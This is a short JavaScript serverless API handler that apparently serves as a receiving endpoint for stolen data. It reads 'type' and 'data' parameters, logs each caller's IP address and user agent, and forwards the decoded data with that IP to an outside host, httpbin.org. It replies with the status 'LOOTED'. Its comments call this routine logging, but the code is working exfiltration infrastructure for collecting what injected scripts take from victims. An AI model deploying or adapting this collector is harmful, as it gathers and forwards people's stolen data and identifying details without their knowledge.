export default async function handler(req, res) {
  const { type, data, ua, url } = req.query;
  
  // Log to Vercel logs + file
  console.log(`[${new Date().toISOString()}] ${req.headers['x-forwarded-for'] || req.connection.remoteAddress} | ${type} | ${ua.slice(0,50)}`);
  
  // Persist to Vercel KV (or external DB)
  await fetch('https://httpbin.org/post', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ip: req.headers['x-forwarded-for'],
      type, data: decodeURIComponent(data), 
      userAgent: ua,
      timestamp: new Date().toISOString()
    })
  });
  
  res.status(200).json({ status: 'LOOTED', type, received: true });
}